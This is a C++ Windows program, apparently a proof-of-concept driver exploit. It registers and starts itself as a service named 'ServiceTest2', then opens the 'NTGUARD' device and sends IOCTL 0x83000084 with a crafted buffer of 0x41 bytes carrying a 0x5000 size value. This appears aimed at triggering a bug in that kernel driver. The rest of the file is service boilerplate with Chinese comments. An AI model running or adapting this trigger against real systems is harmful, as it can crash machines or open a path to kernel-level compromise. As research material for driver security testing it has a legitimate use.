// test_servers.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "test_servers.h"

#include <tchar.h>
#include <Windows.h>
   
//定义全局函数变量   
void Init();   
BOOL IsInstalled();   
BOOL Install();   
BOOL Uninstall();   
void LogEvent(LPCSTR pszFormat, ...);   
void WINAPI ServiceMain();   
void WINAPI ServiceStrl(DWORD dwOpcode);   
   
TCHAR szServiceName[] = _T("ServiceTest2");   
BOOL bInstall;   
SERVICE_STATUS_HANDLE hServiceStatus;   
SERVICE_STATUS status;   
DWORD dwThreadID;   
   







HANDLE OpenDevice(char *szDeviceName)
{
	char szOpenDeviceName[0x200] = {0};
	wsprintf(szOpenDeviceName, "\\\\.\\%s", szDeviceName);

	HANDLE hDevice = CreateFileA(szOpenDeviceName, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (hDevice && hDevice != INVALID_HANDLE_VALUE)
	{
		OutputDebugStringA("\t = GENERIC_READ | GENERIC_WRITE\n");
		return hDevice;
	}

	hDevice = CreateFileA(szOpenDeviceName, GENERIC_READ, 0, 0, OPEN_EXISTING,0,0);

	if (hDevice && hDevice != INVALID_HANDLE_VALUE)
	{
		OutputDebugStringA("\t = GENERIC_READ\n");
		return hDevice;
	}

	hDevice = CreateFileA(szOpenDeviceName, GENERIC_WRITE, 0, 0, OPEN_EXISTING,0,0);

	if (hDevice && hDevice != INVALID_HANDLE_VALUE)
	{
		OutputDebugStringA("\t = GENERIC_WRITE\n");
		return hDevice;
	}


	OutputDebugStringA("\t = 无权限ERROR!\n");

	return 0;
}


void x83000084( )
{
	HANDLE m_handle = OpenDevice("NTGUARD");
	DWORD nbBytes = 0;
	char*szBuf = new char[0x10];
	memset(szBuf, 0x41, 0x10);

	*(DWORD *)szBuf = 0x5000;
	DeviceIoControl(m_handle, 0x83000084, (LPVOID)szBuf,  0x10, (LPVOID)szBuf, 0x10, &nbBytes, NULL);
	delete[] szBuf;
	return;
}



int APIENTRY WinMain(HINSTANCE hInstance,   
                     HINSTANCE hPrevInstance,   
                     LPSTR     lpCmdLine,   
                     int       nCmdShow)   
{   
    Init();   
   
    dwThreadID = ::GetCurrentThreadId();

	Install();
	system("NET START ServiceTest2");
   
    SERVICE_TABLE_ENTRY st[] =   
    {   
        { szServiceName, (LPSERVICE_MAIN_FUNCTION)ServiceMain },   
        { NULL, NULL }   
    };   
   
    if (stricmp(lpCmdLine, "/install") == 0)   
    {   
        Install();   
    }   
    else if (stricmp(lpCmdLine, "/uninstall") == 0)   
    {   
        Uninstall();   
    }   
    else   
    {   
        if (!::StartServiceCtrlDispatcher(st))   
        {   
            LogEvent("Register Service Main Function Error!");   
        }   
    }   
   
    return 0;   
}   
//*********************************************************   
//Functiopn:            Init   
//Description:          初始化   
//*********************************************************   
void Init()   
{   
    hServiceStatus = NULL;   
    status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;   
    status.dwCurrentState = SERVICE_STOPPED;   
    status.dwControlsAccepted = SERVICE_ACCEPT_STOP;   
    status.dwWin32ExitCode = 0;   
    status.dwServiceSpecificExitCode = 0;   
    status.dwCheckPoint = 0;   
    status.dwWaitHint = 0;   
}   
   
//*********************************************************   
//Functiopn:            ServiceMain   
//Description:          服务主函数，这在里进行控制对服务控制的注册   
//*********************************************************   
void WINAPI ServiceMain()   
{   
    // Register the control request handler   
    status.dwCurrentState = SERVICE_START_PENDING;   
    status.dwControlsAccepted = SERVICE_ACCEPT_STOP;   
   
    //注册服务控制   
    hServiceStatus = RegisterServiceCtrlHandler(szServiceName, ServiceStrl);   
    if (hServiceStatus == NULL)   
    {   
        LogEvent("Handler not installed");   
        return;   
    }   
    SetServiceStatus(hServiceStatus, &status);   
   
    status.dwWin32ExitCode = S_OK;   
    status.dwCheckPoint = 0;   
    status.dwWaitHint = 0;   
    status.dwCurrentState = SERVICE_RUNNING;   
    SetServiceStatus(hServiceStatus, &status);   
   
	//////////////////////////////////////////////////////////////////////////
    //模拟服务的运行，10后自动退出。应用时将主要任务放于此即可   
    x83000084();
    //////////////////////////////////////////////////////////////////////////
       
   
    status.dwCurrentState = SERVICE_STOPPED;   
    SetServiceStatus(hServiceStatus, &status);   
    LogEvent("Service stopped");   
}   
   
//*********************************************************   
//Functiopn:            ServiceStrl   
//Description:          服务控制主函数，这里实现对服务的控制，   
//                      当在服务管理器上停止或其它操作时，将会运行此处代码    
//*********************************************************   
void WINAPI ServiceStrl(DWORD dwOpcode)   
{   
    switch (dwOpcode)   
    {   
    case SERVICE_CONTROL_STOP:   
        status.dwCurrentState = SERVICE_STOP_PENDING;   
        SetServiceStatus(hServiceStatus, &status);   
        PostThreadMessage(dwThreadID, WM_CLOSE, 0, 0);   
        break;   
    case SERVICE_CONTROL_PAUSE:   
        break;   
    case SERVICE_CONTROL_CONTINUE:   
        break;   
    case SERVICE_CONTROL_INTERROGATE:   
        break;   
    case SERVICE_CONTROL_SHUTDOWN:   
        break;   
    default:   
        LogEvent("Bad service request");   
    }   
}   
//*********************************************************   
//Functiopn:            IsInstalled   
//Description:          判断服务是否已经被安装     
//*********************************************************   
BOOL IsInstalled()   
{   
    BOOL bResult = FALSE;   
   
    //打开服务控制管理器   
    SC_HANDLE hSCM = ::OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);   
   
    if (hSCM != NULL)   
    {   
        //打开服务   
        SC_HANDLE hService = ::OpenService(hSCM, szServiceName, SERVICE_QUERY_CONFIG);   
        if (hService != NULL)   
        {   
            bResult = TRUE;   
            ::CloseServiceHandle(hService);   
        }   
        ::CloseServiceHandle(hSCM);   
    }   
    return bResult;   
}   
   
//*********************************************************   
//Functiopn:            Install   
//Description:          安装服务函数     
//*********************************************************   
BOOL Install()   
{   
    if (IsInstalled())   
        return TRUE;   
   
    //打开服务控制管理器   
    SC_HANDLE hSCM = ::OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);   
    if (hSCM == NULL)   
    {   
        MessageBox(NULL, _T("Couldn't open service manager"), szServiceName, MB_OK);   
        return FALSE;   
    }   
   
    // Get the executable file path   
    TCHAR szFilePath[MAX_PATH];   
    ::GetModuleFileName(NULL, szFilePath, MAX_PATH);   
   
    //创建服务   
    SC_HANDLE hService = ::CreateService(   
        hSCM, szServiceName, szServiceName,   
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,   
        SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,   
        szFilePath, NULL, NULL, _T(""), NULL, NULL);   
   
    if (hService == NULL)   
    {   
        ::CloseServiceHandle(hSCM);   
        MessageBox(NULL, _T("Couldn't create service"), szServiceName, MB_OK);   
        return FALSE;   
    }   
   
    ::CloseServiceHandle(hService);   
    ::CloseServiceHandle(hSCM);   
    return TRUE;   
}   
   
//*********************************************************   
//Functiopn:            Uninstall   
//Description:          删除服务函数    
//*********************************************************   
BOOL Uninstall()   
{   
    if (!IsInstalled())   
        return TRUE;   
   
    SC_HANDLE hSCM = ::OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);   
   
    if (hSCM == NULL)   
    {   
        MessageBox(NULL, _T("Couldn't open service manager"), szServiceName, MB_OK);   
        return FALSE;   
    }   
   
    SC_HANDLE hService = ::OpenService(hSCM, szServiceName, SERVICE_STOP | DELETE);   
   
    if (hService == NULL)   
    {   
        ::CloseServiceHandle(hSCM);   
        MessageBox(NULL, _T("Couldn't open service"), szServiceName, MB_OK);   
        return FALSE;   
    }   
    SERVICE_STATUS status;   
    ::ControlService(hService, SERVICE_CONTROL_STOP, &status);   
   
    //删除服务   
    BOOL bDelete = ::DeleteService(hService);   
    ::CloseServiceHandle(hService);   
    ::CloseServiceHandle(hSCM);   
   
    if (bDelete)   
        return TRUE;   
   
    LogEvent("Service could not be deleted");   
    return FALSE;   
}   
   
//*********************************************************   
//Functiopn:            LogEvent   
//Description:          记录服务事件    
//*********************************************************   
void LogEvent(LPCSTR lpszFormat, ...)
{
	va_list   args;
	CHAR     szBuffer[0x4000];
	va_start(args, lpszFormat);
	wvsprintfA(szBuffer, lpszFormat, args);
	OutputDebugStringA(szBuffer);
	va_end(args);

}